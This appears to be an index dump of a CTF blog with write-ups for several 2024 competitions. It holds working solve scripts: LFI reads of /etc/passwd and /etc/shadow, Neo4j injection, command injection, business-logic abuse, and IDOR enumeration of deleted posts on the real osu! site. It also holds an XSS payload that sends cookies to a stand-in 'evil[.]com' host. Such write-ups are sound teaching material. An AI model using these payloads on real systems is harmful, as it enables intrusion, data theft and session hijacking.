from server import decrypt from hashlib import md5 import base64 import string import re b64_map = {} # { b64: [md5, md5...], b64: [md5, md5] } logs = [] keys = [] b64 = \"\" def brute_force_key(encrypted, key, target_md5): factor = len(encrypted) // len(key) + 1 key = key * factor key_bytes = key.encode() enc_bytes = base64.b64decode(encrypted) dec_bytes = bytearray() for i in range(0, len(enc_bytes)): dec_bytes.append(enc_bytes[i] ^ key_bytes[i]) if md5(dec_bytes).hexdigest() == target_md5: return key[i] # parse decrpytion server log with open('decryption_server.log', 'r') as file: logs = file.readlines() for log in logs: b64_match = re.search(r\"Received encrypted message (.*)\", log) if b64_match: b64 = b64_match.group(1) longest = True match = re.search(r\"Partial message digest is (.*)\", log) if match: hash_ = match.group(1) if b64_map.get(b64) != None: b64_map[b64].append(hash_) else: b64_map[b64] = [hash_] # brute force key in hash for target in b64_map: key = \"\" for md5_hash in b64_map[target]: for c in string.printable: if key == \"\": payload = str(c) * len(target) else: payload = key + str(c) * len(target) key_part = brute_force_key(target, payload, md5_hash) if key_part: key += key_part break keys.append(key) print(\"key used for encryption:\", max(keys)) with open('key.txt', 'w') as file: file.write(max(keys)) print(\"decrypted text \", '-'*100) for b in b64_map: print(decrypt(b)) ","date":"2024-05-29","objectID":"/nahamcon-ctf-2024/:2:2","series":null,"tags":["WebDav","flask","flask Session","Code Review","WordPress","Brute-Force"],"title":"NahamCon CTF 2024 - writeups","uri":"/nahamcon-ctf-2024/#decryptpy"},{"categories":["CTF","Web","OSINT"],"content":"OSINT, IDOR + Binary Search","date":"2024-03-08","objectID":"/time-traveler/","series":null,"tags":["Web Archives","IDOR"],"title":"osu!gaming CTF 2024 - osint/time-traveler","uri":"/time-traveler/"},{"categories":["CTF","Web","OSINT"],"content":"Write-up for osu!gaming CTF OSINT challenge - time-traveler (334 points) I was initially solving web/when-you-dont-see-it challenge when I solved this, I even complained in discord saying their flag doesn‚Äôt work, not knowing it is for this challenge lol. ","date":"2024-03-08","objectID":"/time-traveler/:0:0","series":null,"tags":["Web Archives","IDOR"],"title":"osu!gaming CTF 2024 - osint/time-traveler","uri":"/time-traveler/#"},{"categories":["CTF","Web","OSINT"],"content":" osint/time-traveler challenge ","date":"2024-03-08","objectID":"/time-traveler/:0:0","series":null,"tags":["Web Archives","IDOR"],"title":"osu!gaming CTF 2024 - osint/time-traveler","uri":"/time-traveler/#osinttime-traveler"},{"categories":["CTF","Web","OSINT"],"content":" OSINT partWe were given https://osu.ppy.sh/users/11118671 which is a profile page for a user Strellic in osu! I tried looking around but ultimately was not able to find anything that will help progress. I went back to focus on the profile page message. I tried looking at Strellic‚Äôs profile in Wayback machine (a website where we can enter a URL and view the previous versions of a webpage). There was a snapshot in February 29 in Strellic‚Äôs profile. This leads to another clue that there is a post in the introductions forum page. https://osu.ppy.sh/community/forums/8 Looking around in the live website, I wasn‚Äôt able to find Strellic‚Äôs post. I thought of again utilizing the wayback machine again and found something interesting. Strellic‚Äôs post was also captured in February 29 in wayback machine. when we hover this post we find crucial information like the date of the post (2024-02-09T07:45:27+00:00) and forum ID. I tried directly accessing the forum page from its forum ID https://osu.ppy.sh/community/forums/topics/1890614 but I was not able to view it. ","date":"2024-03-08","objectID":"/time-traveler/:1:0","series":null,"tags":["Web Archives","IDOR"],"title":"osu!gaming CTF 2024 - osint/time-traveler","uri":"/time-traveler/#osint-part"},{"categories":["CTF","Web","OSINT"],"content":" Web partAfter knowing that the flag might be in the deleted post in the introductions forum. The challenge now is to find a way to access a previously post in a forum. As it turns out there is. After looking around existing post and links in a forum. I was able to find information that helped me solved the challenge. When you create a topic in a forum - like Strellic did. It will generate a topic that looks like this in the URL https://osu.ppy.sh/community/forums/topics/1888734 (post in the screenshots just used as an example) Along with this, there also another link generated called a POST which looks something like this in the URL https://osu.ppy.sh/community/forums/posts/9448728. Accessing this directly just redirects you to the forum topic. However, accessing the specific post by accessing the /raw endpoint will redirect you to the actual message of that post https://osu.ppy.sh/community/forums/posts/9448728/raw?quote=1 I also found out that even deleted post in the forum can be viewed using this /raw endpoint. For example, I created a post in the introductions page and took note of the URL. I was able to access it even when deleted https://osu.ppy.sh/community/forums/posts/9463478/raw?quote=1 (this does not work now but it would look something like this) This is helpful because if we find out the ID of Strellic‚Äôs post we would be able to view his message. ","date":"2024-03-08","objectID":"/time-traveler/:2:0","series":null,"tags":["Web Archives","IDOR"],"title":"osu!gaming CTF 2024 - osint/time-traveler","uri":"/time-traveler/#web-part"},{"categories":["CTF","Web","OSINT"],"content":" IDOR + Binary SearchThe POST ID is incremental, which means we can view the post. However simply decrementing the POST ID will take a long time and too many request. I found out a faster way by just accessing the URL without adding the endpoint. Using this scheme will redirect to the POST which will reveal the date and time https://osu.ppy.sh/community/forums/posts/9448728. Since this is being redirected. Since we know that Strellic‚Äôs deleted post was from February 29. I just needed to find a post posted in February 29 to narrow down the search. I did this in the browser and just looked at the post date. For example. https://osu.ppy.sh/community/forums/posts/9448728 - February 25 https://osu.ppy.sh/community/forums/posts/9450728 - February 26 https://osu.ppy.sh/community/forums/posts/9455728 - March 1 ‚Ä¶ https://osu.ppy.sh/community/forums/posts/9454300 - February 29 Then starting from this ID we can increment it to find Strellic post using the /raw endpoint. Here is the script i used: def find_strellic(): start = 9454300 end = 9455000 headers = { \"Cookie\": \u003credacted\u003e } for i in range(start, end): print(f\"requesting {i}...\", end=\"\") resp = requests.get(f\"https://osu.ppy.sh/community/forums/posts/{i}/raw?quote=1\", headers=headers) print(resp.status_code) # request the page again while 429 is response while resp.status_code == 429: time.sleep(20) print(f\"requesting {i}...\", end=\"\") resp = requests.get(f\"https://osu.ppy.sh/community/forums/posts/{i}/raw?quote=1\", headers=headers) print(resp.status_code) # flag if \"Strellic\" in resp.text: print(resp.text) break The flag was found in https://osu.ppy.sh/community/forums/posts/9454307/raw?quote=1 flag: osu{w4it_are_y0u_a_t1me_tr4veler} ","date":"2024-03-08","objectID":"/time-traveler/:3:0","series":null,"tags":["Web Archives","IDOR"],"title":"osu!gaming CTF 2024 - osint/time-traveler","uri":"/time-traveler/#idor--binary-search"},{"categories":["CTF","Web"],"content":"indexedDB, LFI, CSV, Boolean-based Neo4j Injection","date":"2024-05-12","objectID":"/tbtlctf-2024/","series":null,"tags":["indexedDB","GraphQL","Neo4J","pandas","python","code-review","lfi","php"],"title":"TBTL CTF 2024 - web(4x) writeups","uri":"/tbtlctf-2024/"},{"categories":["CTF","Web"],"content":"Writeups for solved TBTL CTF 2024 challenges Solved 4/4 web challenges which is nice points: 600 rank: 96/791 ","date":"2024-05-12","objectID":"/tbtlctf-2024/:0:0","series":null,"tags":["indexedDB","GraphQL","Neo4J","pandas","python","code-review","lfi","php"],"title":"TBTL CTF 2024 - web(4x) writeups","uri":"/tbtlctf-2024/#"},{"categories":["CTF","Web"],"content":" web/Butterfly#indexDB #local-storage #session-storage We‚Äôve noticed some unusual communication occurring on a particular website. Could you assist in uncovering any hidden secrets being exchanged through this seemingly innocent platform? https://tbtl-butterfly.chals.io/ indexdb had some suspicious looking data (flag) U2FsdGVkX19wWL7itIL7TZcLTP/e1ulrZolI9AHTA8OBGOCodbZKdOxPF41rGV9C+X7PZPt9ISJKQMpTl+Fwew== Local storage stored some source code {\"code\":\"CryptoJS.AES.decrypt(CIPHERTEXT, KEY).toString(CryptoJS.enc.Utf8)\"} Session storage stored the secret AES key! secret key is very secure From this we have the algo, key and the ciphertext. We can decrypt it in JS console.js var CIPHERTEXT = \"U2FsdGVkX19wWL7itIL7TZcLTP/e1ulrZolI9AHTA8OBGOCodbZKdOxPF41rGV9C+X7PZPt9ISJKQMpTl+Fwew==\" var KEY = \"secret key is very secure\" CryptoJS.AES.decrypt(CIPHERTEXT, KEY).toString(CryptoJS.enc.Utf8) flag: TBTL{th15_1S_n0t_53CUR3_5T0r4G3} ","date":"2024-05-12","objectID":"/tbtlctf-2024/:0:0","series":null,"tags":["indexedDB","GraphQL","Neo4J","pandas","python","code-review","lfi","php"],"title":"TBTL CTF 2024 - web(4x) writeups","uri":"/tbtlctf-2024/#webbutterfly"},{"categories":["CTF","Web"],"content":" web/Talk-to-you#lfi LFI challenge that has a test.php rabbit hole Standard files can be found and if we just look around we can find the flag stored in database.sqlite. solve script import requests url = \"https://tbtl-talk-to-you.chals.io/\" query=\"?page=/../ctf/index.php\" query=\"?page=/../../../../../../../../../../proc/self/environ\" query=\"?page=/../../../../../../../../../../etc/passwd\" query=\"?page=/../../../../../../../../../../etc/shadow\" query=\"?page=/../../../../../../../../../../flag.txt\" query=\"?page=database.sqlite\" # query=\"?page=php://filter/convert.base64-encode/resource=/etc/test.php\" r = requests.get(url+query) # r = requests.get(test) print(r.headers) print(r.text) flag: TBTL{4Typ1c41_d4T4B453_u54g3} ","date":"2024-05-12","objectID":"/tbtlctf-2024/:0:0","series":null,"tags":["indexedDB","GraphQL","Neo4J","pandas","python","code-review","lfi","php"],"title":"TBTL CTF 2024 - web(4x) writeups","uri":"/tbtlctf-2024/#webtalk-to-you"},{"categories":["CTF","Web"],"content":" web/RND for DATA Science#csv-injection #pandas I guess theres some CSV Injection to trick intended pandas query from flask import Flask, request, send_file from io import StringIO, BytesIO import pandas as pd import requests app = Flask(__name__) @app.route(\"/\") def index(): return app.send_static_file('index.html') @app.route(\"/generate\", methods=['POST']) def generate(): data = request.form delimiter_const = 'delimiter' r = requests.post('http://127.0.0.1:5001', data=data) if r.text == 'ERROR': return 'ERROR' csv = StringIO(r.text) df = pd.read_csv(csv) # Filter out secrets first = list(df.columns.values)[1] df = df.query(f'{first} != \"FLAG\"') string_df = StringIO(df.to_csv(index=False, sep=data[delimiter_const])) bytes_df = BytesIO() bytes_df.write(string_df.getvalue().encode()) bytes_df.seek(0) return send_file(bytes_df, download_name=\"data.csv\") The important code here is the filtering of 2nd column, if we manage to move the columns before insert we can leak the flag # Filter out secrets first = list(df.columns.values)[1] df = df.query(f'{first} != \"FLAG\"') If we send newline \\n and , the resulting CSV table will be moved and the word FLAG will move to the first column import requests url = \"https://tbtl-rnd-for-data-science.chals.io/generate\" data = { \"numColumns\": 2, \"columnName0\": \"test\\n\", \"columnName1\": \"rank,\", \"delimiter\": \",\" } r = requests.post(url, data=data) print(r.text) flag: TBTL{d4T4_5c13nc3_15_n07_f0r_r0ck135} ","date":"2024-05-12","objectID":"/tbtlctf-2024/:0:0","series":null,"tags":["indexedDB","GraphQL","Neo4J","pandas","python","code-review","lfi","php"],"title":"TBTL CTF 2024 - web(4x) writeups","uri":"/tbtlctf-2024/#webrnd-for-data-science"},{"categories":["CTF","Web"],"content":" web/Mexico City Tour#neo4j #graphql Injection challenge in neo4j graphql. The query searches a start station and end station id and does some calculation and returns the distance from each other. There is a station in which the flag is hidden. Another challenge is that it converts the distance returned from the query as an integer For my solution, I moslty read the docs and used chat-gpt for this challenge https://neo4j.com/docs/cypher-manual/current/functions/string/ I was trying to convert to ascii code initially but not able to make it work. This just became boolean-based injection in the end. source code from flask import Flask, render_template, url_for, redirect, request from neo4j import GraphDatabase app = Flask(__name__) URI = \"bolt://localhost:7687\" AUTH = (\"\", \"\") def query(input_query): with GraphDatabase.driver(URI, auth=AUTH) as driver: driver.verify_connectivity() session = driver.session() tx = session.begin_transaction() records = [t for t in tx.run(input_query)] tx.rollback() return records @app.route(\"/\") def index(): distance = request.args.get('distance') stations = query('MATCH (n:Station) RETURN n.id, n.name ORDER BY n.id DESC;') return render_template('index.html', stations=stations, distance=distance) @app.route(\"/search\", methods=['POST']) def search(): start = request.form[\"startStation\"] end = request.form['endStation'] distance_query = f'MATCH (n {{id: {start}}})-[p *bfs]-(m {{id: {end}}}) RETURN size(p) AS distance;' # distance_query = 'MATCH (n {id: city1})-[p *bfs]-(m {id: city2}) RETURN size(p) AS distance;' distance = query(distance_query) if len(distance) == 0: distance = 'unknown' else: distance = int(distance[0]['distance']) return redirect(url_for('.index', distance=distance)) Initial query looks like this distance_query = f'MATCH (n {{id: {start}}})-[p *bfs]-(m {{id: {end}}}) RETURN size(p) AS distance;' # injected distance_query = 'MATCH (n {id: 1})//})-[p *bfs]-(m {id: 2}) RETURN size(p) AS distance;' sample payload wlll look like # returns 1 if substring index 0 of n.name is \"F\" payload = \"-1}) RETURN toInteger(replace(substring(n.name, 0, 1), \\\"F\\\", \\\"1\\\")) AS distance;// # payload injected distance_query = 'MATCH (n {id: -1}) RETURN toInteger(replace(substring(n.flag,\"+str(i)+\", 1), \\\"\"+q+\"\\\", \\\"1337\\\")) AS distance;//})-[p *bfs]-(m {id: 2}) RETURN size(p) AS distance;' # })-[p *bfs]-(m {id: 2}) RETURN size(p) AS distance; gets commented out solve.py import requests import re url = 'https://tbtl-mexico-city-tour.chals.io/search' # distance_query = 'MATCH (n {id: 1})//})-[p *bfs]-(m {id: 2}) RETURN size(p) AS distance;' def querier(i, q): # generate a single query payload = \"-1}) RETURN toInteger(replace(substring(n.flag,\"+str(i)+\", 1), \\\"\"+q+\"\\\", \\\"1337\\\")) AS distance;//\" data = { \"startStation\": payload, \"endStation\": \"1\", } return data def main(): _min = 32 _max = 126 flag = \"\" for i in range(0, 30): for c in range(_min, _max): q = chr(c) data = querier(i, q) r = requests.post(url, data=data) if re.search(r'1337', r.text): flag += q print(flag) break else: pass if __name__ == \"__main__\": main() flag: TBTL{wh3R3_15_mY_GR4PH_h1dd3n} ","date":"2024-05-12","objectID":"/tbtlctf-2024/:0:0","series":null,"tags":["indexedDB","GraphQL","Neo4J","pandas","python","code-review","lfi","php"],"title":"TBTL CTF 2024 - web(4x) writeups","uri":"/tbtlctf-2024/#webmexico-city-tour"},{"categories":["CTF","Web"],"content":"Abusing API business logic to get rich","date":"2024-04-30","objectID":"/umdctf-2024/","series":null,"tags":["API","Business-Logic"],"title":"UMDCTF 2024 - web(2x) writeups","uri":"/umdctf-2024/"},{"categories":["CTF","Web"],"content":"Writeups for solved UMDCTF 2024 web challenges (2/4) ","date":"2024-04-30","objectID":"/umdctf-2024/:0:0","series":null,"tags":["API","Business-Logic"],"title":"UMDCTF 2024 - web(2x) writeups","uri":"/umdctf-2024/#"},{"categories":["CTF","Web"],"content":" web","date":"2024-04-30","objectID":"/umdctf-2024/:0:0","series":null,"tags":["API","Business-Logic"],"title":"UMDCTF 2024 - web(2x) writeups","uri":"/umdctf-2024/#web"},{"categories":["CTF","Web"],"content":" web/Donations#API #business-logic Show off your capitalistic altruism today. https://donations.challs.umdctf.io Challenge about abusing the business logic and increasing our initial account balance We can view the JS source code and find API endpoints. https://donations-api.challs.umdctf.io/api/flag endpoint returns only the wealthy may view the treasure. We start with a currency of 1000. To get the flag, we need to increase our currency to 5000 in our account. The main feature of the website is that we can send/donate to another user but the requirement is that we can only send to lisanalgaib. To solve it, I sent negative values in the donate API endpoint and it accepted it. donate_url = \"https://donations-api.challs.umdctf.io/api/donate?username=lisanalgaib\" donation = { \"to\": \"lisanalgaib\", \"currency\": -4000 # 1000 -(-4000) = 5000 } r = s.post(donate_url, data=donation) solve.py import requests, os flag_url = \"https://donations-api.challs.umdctf.io/api/flag\" register_url = \"https://donations-api.challs.umdctf.io/api/register\" login_url = \"https://donations-api.challs.umdctf.io/api/login\" donate_url = \"https://donations-api.challs.umdctf.io/api/donate?username=lisanalgaib\" username = os.environ.get('username') password = os.environ.get('password') main_creds = {\"username\": username, \"password\": password} def login(s, data): r = s.post(login_url, data=data) print(r.text) return s def register(data): s = requests.session() r = s.post(register_url, data=data) print(r.text) return s def donate(s): # allows negative values to increase our own money donation = { \"to\": \"lisanalgaib\", \"currency\": -4000 } r = s.post(donate_url, data=donation) print(r.text) def main(): s = requests.Session() s = register(main_creds) s = login(s, main_creds) donate(s) r = s.get(flag_url) print(r.text) if __name__ == \"__main__\": main() flag: UMDCTF{BE20$_1s_7h3_T0N6U3_OF_Th3_uN5e3N} ","date":"2024-04-30","objectID":"/umdctf-2024/:1:0","series":null,"tags":["API","Business-Logic"],"title":"UMDCTF 2024 - web(2x) writeups","uri":"/umdctf-2024/#webdonations"},{"categories":["CTF","Web"],"content":" web/Donations (but I fixed it) Bezos is not happy with what you did to his net worth. https://donations2.challs.umdctf.io The challenge is similar to the previous challenge that we need to increase our initial balance. However, the donate API is ‚Äúfixed‚Äù and does not allow negative integer inputs. There is still no way to change the recipient of our donation. It still requires lisanalgaib To solve I learned i can send donations in multiple users by specifying an array of users instead of a single user example: to=[\"lisanalgaib\",\"another_user\"]. This way the required user is still included in the request and that we can also donate to another user. donation = { \"to\": [\"lisanalgaib\", \"another_user\"], \"currency\": 1000 } r = s.post(\"https://donations2-api.challs.umdctf.io/api/donate?username=lisanalgaib\", data=donation) This means that i can create multiple accounts and send money to my main account. solve.py import requests, os flag_url = \"https://donations2-api.challs.umdctf.io/api/flag\" register_url = \"https://donations2-api.challs.umdctf.io/api/register\" login_url = \"https://donations2-api.challs.umdctf.io/api/login\" donate_url = \"https://donations2-api.challs.umdctf.io/api/donate?username=lisanalgaib\" username = os.environ.get('username') password = os.environ.get('password') main_creds = {\"username\": username, \"password\": password} def login(s, data): r = s.post(login_url, data=data) print(r.text) return s def register(data): s = requests.session() r = s.post(register_url, data=data) print(r.text) return s def donate(s): # donate to multiple users only deducting 1000 donation = { \"to\": [\"lisanalgaib\", username], \"currency\": 1000 } r = s.post(donate_url, data=donation) print(r.text) def main(): # create random users and send donation to main account for i in range(5): new_user = \"user_abc\" + str(i) creds = {\"username\": new_user, \"password\": \"password\"} s = register(creds) s = login(s, creds) donate(s) # get flag on main account s = requests.Session() s = login(s, main_creds) r = s.get(flag_url) print(r.text) if __name__ == \"__main__\": main() flag: UMDCTF{TeS7_your_CHAL1En93S 6UyS}. ","date":"2024-04-30","objectID":"/umdctf-2024/:2:0","series":null,"tags":["API","Business-Logic"],"title":"UMDCTF 2024 - web(2x) writeups","uri":"/umdctf-2024/#webdonations-but-i-fixed-it"},{"categories":["CTF","Web"],"content":"CMD injection, HTTP, Header injection","date":"2024-04-22","objectID":"/umass-ctf-2024/","series":null,"tags":["Header Injection","Command Injection","Code Review","Go"],"title":"UMassCTF 2024 - web(3x) writeups","uri":"/umass-ctf-2024/"},{"categories":["CTF","Web"],"content":"Writeups for solved UMassCTF 2024 web challenges (3/5) ","date":"2024-04-22","objectID":"/umass-ctf-2024/:0:0","series":null,"tags":["Header Injection","Command Injection","Code Review","Go"],"title":"UMassCTF 2024 - web(3x) writeups","uri":"/umass-ctf-2024/#"},{"categories":["CTF","Web"],"content":" web/Spongebobs Homepage Welcome to this great website about myself! Hope you enjoy ;) DIRBUSTER or any similar tools are NOT allowed. There is a #command-injection in the /assets/image path in size query parameter. The size is passed on to the convert-im6.q16 command. When I tried various command injection payloads, it resulted in an error. During my tries, I wasn‚Äôt able to escape from the current command, so I just looked for available arguments. I learned can use -set argument in convert-im6.q16 to set meta tags to the image. This resulted to the following payload: 200 -set Flag \"$(cat flag.txt | base64)\". Encoding in base64 is not really required for this challenge. http://spongebob-blog.ctf.umasscybersec.org/assets/image?name=spongebob\u0026size=200%20-set%20Flag%20%22$(cat%20flag.txt%20|%20base64)%22 We can download the image rendered and view using exiftool and decode from base64 curl -s 'http://spongebob-blog.ctf.umasscybersec.org/assets/image?name=spongebob\u0026size=200%20-set%20Flag%20%22$(cat%20flag.txt%20|%20base64)%22' | exiftool - | grep Flag | cut -d ':' -f 2 | tr -d '!' | xargs | base64 -d flag: UMASS{B4S1C_CMD_INJ3CTI0N} ","date":"2024-04-22","objectID":"/umass-ctf-2024/:0:0","series":null,"tags":["Header Injection","Command Injection","Code Review","Go"],"title":"UMassCTF 2024 - web(3x) writeups","uri":"/umass-ctf-2024/#webspongebobs-homepage"},{"categories":["CTF","Web"],"content":" web/Crabby Clicker I‚Äôve created a new game called Crabby Clicker! It‚Äôs a fun game where you click on a crab to get points. Once you get enough points, you can buy the flag! We are given a #go server which apparently has bugs in it. We needed to click 100 times by sending requests to the /click endpoint. The bug was the state is not saved accross requests. I think doing in HTTP resets the connection so I tried doing in TCP in pwn and it worked. main.go package main import ( \"bufio\" \"fmt\" \"net\" \"os\" \"strings\" \"time\" ) type RequestHandler struct { burgers int conn net.Conn } var GLOBAL_STATE RequestHandler func main() { // Listen on TCP port 8080 on all interfaces. ln, err := net.Listen(\"tcp\", \":1337\") if err != nil { fmt.Println(\"Error listening:\", err.Error()) return } defer ln.Close() fmt.Println(\"Listening on :1337\") GLOBAL_STATE = RequestHandler{burgers: 0, conn: nil} for { // Accept a connection. conn, err := ln.Accept() if err != nil { fmt.Println(\"Error accepting: \", err.Error()) return } // burger to the GLOBAL_STATE from the request handler so we can track between requests handler := RequestHandler{burgers: GLOBAL_STATE.burgers, conn: conn} go handler.handleRequest() } } func (r *RequestHandler) handleRequest() { defer r.conn.Close() reader := bufio.NewReader(r.conn) for { // Set a deadline for reading. If a second passes without reading any data, a timeout will occur. r.conn.SetReadDeadline(time.Now().Add(1 * time.Second)) // Read and parse the request headers request, err := readHTTPHeader(reader) if err != nil { return } requestLines := strings.Split(request, \"\\n\") if len(requestLines) \u003c 1 { fmt.Println(\"Invalid request\") return } // Parse the request line requestLine := strings.Fields(requestLines[0]) if len(requestLine) \u003c 3 { fmt.Println(\"Invalid request\") return } method := requestLine[0] uri := requestLine[1] // Check if the request is a valid GET request if method != \"GET\" { r.conn.Write([]byte(\"HTTP/1.1 405 Method Not Allowed\\r\\n\\r\\n\")) return } // Handle GET request if uri == \"/\" { r.generateResponse(` Welcome to Crabby Clicker! A HTTP based clicker game where you can earn burgers to get the flag. Make a request to /click to gain a burger. I use my own custom HTTP server implementation to manage the state of the game. It's not fully working, I am running into some bugs. `) } else if uri == \"/click\" { // BUG: Weird thing where the state is not updated between requests?? r.burgers++ r.generateResponse(\"burger added\") } else if uri == \"/flag\" { if r.burgers \u003e= 100 { r.generateResponse(\"fmt.Sprintf(\"Flag: UMASS{%s}\", os.Getenv(\"FLAG\")\")) } else { r.generateResponse(\"Not enough burgers\") } } else { r.generateResponse(\"Not found\") } } } func (r *RequestHandler) generateResponse(message string) { r.conn.Write([]byte(fmt.Sprintf(\"HTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\n\\r\\n%s\\nburgers: %d\\n\", message, r.burgers))) } func readHTTPHeader(reader *bufio.Reader) (string, error) { // Read headers until \\r\\n\\r\\n var requestLines []string for { line, err := reader.ReadString('\\n') if err != nil { return \"\", err } requestLines = append(requestLines, line) // Check if the current line marks the end of the headers if line == \"\\r\\n\" { break } } return strings.Join(requestLines, \"\"), nil } solve.py from pwn import * host = \"crabby-clicker.ctf.umasscybersec.org\" port = 80 conn = remote(host, port) # clicker for i in range(100): print(\"Burger:\", i+1) conn.send(f\"GET /click HTTP/1.1\\r\\n\") conn.send(f\"Host: {host}\\r\\n\") conn.send(\"\\r\\n\") # flag conn.send(f\"GET /flag HTTP/1.1\\r\\n\") conn.send(f\"Host: {host}\\r\\n\") conn.send(\"\\r\\n\") response = conn.recvall().decode() print(response) conn.close() flag: UMASS{y_w0uld_u_w4nt_mult1p13_r3qu35t5} ","date":"2024-04-22","objectID":"/umass-ctf-2024/:0:0","series":null,"tags":["Header Injection","Command Injection","Code Review","Go"],"title":"UMassCTF 2024 - web(3x) writeups","uri":"/umass-ctf-2024/#webcrabby-clicker"},{"categories":["CTF","Web"],"content":" web/Holesome Birthday PartySponbebob‚Äôs birthday party invitation. It requires specific headers to enter. When we first view the webpage, it said requires a User-Agent. We can see the requirements/hints in the response as we progress. Challenges: CONGRATS, you got invited to my birthday party! To gain your ticket for entrance, you must first prove that your browser is from ‚ÄúBikini Bottom‚Äù! Good to see you here, mate. Sorry, but you‚Äôre too early for the Spongebob Squarepant‚Äôs birthday party! Bravo! You made it just on time! But‚Ä¶ I‚Äôve been trying to learn French‚Ä¶ can you speak French? C‚Äôest tr√®s chouette! Suddenly I really miss my great-grandma (‡ÆáÔπè‡Æá`ÔΩ°) Can you get me some cookies? I want a cookie with the ‚Äúflavor‚Äù of ‚Äúchocolate_chip‚Äù So yummy! I now grant you the ticket of entrance to the party, but can you find your way in? . For challenge 5, The response sets a cookie to Login=base64({\"loggedin\": false}). Looks like it needs to be set to true solve.py import requests import base64 from datetime import datetime # spongebob birthday date_obj = datetime(year=2024, month=7, day=14) date_str = date_obj.strftime('%a, %d %b %Y %H:%M:%S GMT') # chall 5 login_cookie = base64.b64encode('{\"loggedin\": true}'.encode()).decode() headers = { \"User-Agent\": \"Bikini Bottom\", # chall 1 \"Date\": date_str, # chall 2 \"Accept-Language\": \"fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\", # chall 3 \"Cookie\": f\"flavor=chocolate_chip; Login={login_cookie}\", # chall 4-5 } r = requests.get(\"http://holesomebirthdayparty.ctf.umasscybersec.org/\", headers=headers) print(r.text) flag: UMASS{B3k3nIwH3rLP0oL~} ","date":"2024-04-22","objectID":"/umass-ctf-2024/:0:0","series":null,"tags":["Header Injection","Command Injection","Code Review","Go"],"title":"UMassCTF 2024 - web(3x) writeups","uri":"/umass-ctf-2024/#webholesome-birthday-party"},{"categories":["CTF","Web","Rev","Misc"],"content":"Bash jails, Blind XSS \u0026 CMD injection, etc.","date":"2024-04-16","objectID":"/b01lers-2024/","series":null,"tags":["XSS","Command-Injection","Filter-bypass","Minecraft","Python","Jail","bash","Javascript","Deobfuscation","Code-Review"],"title":"b01lers CTF 2024 - writeups","uri":"/b01lers-2024/"},{"categories":["CTF","Web","Rev","Misc"],"content":"Writeups for solved b01lers CTF 2024 challenges points: 2366 rank: 61/393 ","date":"2024-04-16","objectID":"/b01lers-2024/:0:0","series":null,"tags":["XSS","Command-Injection","Filter-bypass","Minecraft","Python","Jail","bash","Javascript","Deobfuscation","Code-Review"],"title":"b01lers CTF 2024 - writeups","uri":"/b01lers-2024/#"},{"categories":["CTF","Web","Rev","Misc"],"content":" misc","date":"2024-04-16","objectID":"/b01lers-2024/:0:0","series":null,"tags":["XSS","Command-Injection","Filter-bypass","Minecraft","Python","Jail","bash","Javascript","Deobfuscation","Code-Review"],"title":"b01lers CTF 2024 - writeups","uri":"/b01lers-2024/#misc"},{"categories":["CTF","Web","Rev","Misc"],"content":" misc/wabash wabash, its a river, but also a new shell! Flag is in /flag.txt Shell challenge - it adds wa on start of each command and arguments seperated with spaces so commands and args will not work. Example input: cat /flag.txt \u003e wacat wa/flag.txt Solution: |cat\u003c/flag.txt flag: bctf{wabash:_command_not_found521065b339eb59a71c06a0dec824cd55} ","date":"2024-04-16","objectID":"/b01lers-2024/:1:0","series":null,"tags":["XSS","Command-Injection","Filter-bypass","Minecraft","Python","Jail","bash","Javascript","Deobfuscation","Code-Review"],"title":"b01lers CTF 2024 - writeups","uri":"/b01lers-2024/#miscwabash"},{"categories":["CTF","Web","Rev","Misc"],"content":" misc/bash cat with pipeIt allows commands. but certain characters and words are getting filtered out like ()\"\"$*? among others. Also, the word flag is not allowed as input. Solution: cat {f,}lag.txt flag: bctf{owwwww_th4t_hurt} ","date":"2024-04-16","objectID":"/b01lers-2024/:2:0","series":null,"tags":["XSS","Command-Injection","Filter-bypass","Minecraft","Python","Jail","bash","Javascript","Deobfuscation","Code-Review"],"title":"b01lers CTF 2024 - writeups","uri":"/b01lers-2024/#miscbash-cat-with-pipe"},{"categories":["CTF","Web","Rev","Misc"],"content":" misc/chest-mix Here‚Äôs a minecraft world, the flag is on a piece of paper in the the chest by spawn, it‚Äôs hard to miss. Version 1.20 We are given Minecraft world save file, look for ways to parse this. I found a chunk extractor script that can extract contents from a region save. From there we can grep each region for any minecraft chunk/block we want. https://github.com/sudofox/minecraft-utils/blob/master/region-parser/region-parser.sh # unzip the save file and under regions run the script for each .mca file ./region-parser.sh r.0.-1.mca ./region-parser.sh r.0.0.mca # ... # after unpacking all we can check each content if it contains chest / paper find . -name \"*.nbt\" -exec grep minecraft:chest {} \\; find . -name \"*.nbt\" -exec grep minecraft:paper {} \\; # we can just search for the flag find . -name \"*.nbt\" -exec grep -a bctf {} \\; flag: bctf{ch1st_ch2st_ch3st_ch4st_ch5st} ","date":"2024-04-16","objectID":"/b01lers-2024/:3:0","series":null,"tags":["XSS","Command-Injection","Filter-bypass","Minecraft","Python","Jail","bash","Javascript","Deobfuscation","Code-Review"],"title":"b01lers CTF 2024 - writeups","uri":"/b01lers-2024/#miscchest-mix"},{"categories":["CTF","Web","Rev","Misc"],"content":" web","date":"2024-04-16","objectID":"/b01lers-2024/:0:0","series":null,"tags":["XSS","Command-Injection","Filter-bypass","Minecraft","Python","Jail","bash","Javascript","Deobfuscation","Code-Review"],"title":"b01lers CTF 2024 - writeups","uri":"/b01lers-2024/#web"},{"categories":["CTF","Web","Rev","Misc"],"content":" web/b01ler-ad#xss/blind #filter-bypass XSS challenge - We are allowed to input any html data we want and the admin visits that but the content should not contain quotes, double quotes and backticks: Main challenge const content = req.body.content.replace(\"'\", '').replace('\"', '').replace(\"`\", ''); const urlToVisit = CONFIG.APPURL + '/admin/view/?content=' + content; We can use String.fromCharCode https://charcode98.neocities.org/ to avoid using quotes and encode our URL before sending it to the admin. Admin visits our site with their cookies in the query. import requests url = 'http://b01ler-ads.hammer.b01le.rs/review' # fetch('evil[.]com?cookie'=document.cookie) payload = \"\"\" \u003cscript\u003e var url = String.fromCharCode(104, 116, 116, 112, 58...) fetch(url+ encodeURI(document.cookie)) \u003c/script\u003e \"\"\" encoded = \"%3Cscript%3E%0A%20%20%20%20let%20url%20%3D%20String%2EfromCharCode%28104%2C%20116%2C%20116%2C%20112%2C%2058%2E%2E%2E%29%0A%20%20%20%20fetch%28url%20%20encodeURI%28document%2Ecookie%29%29%0A%3C%2Fscript%3E\" data = { 'content':encoded } r = requests.post(url, data=data) print(r.text) listener flag: bctf{wow_you_can_get_a_free_ad_now!} 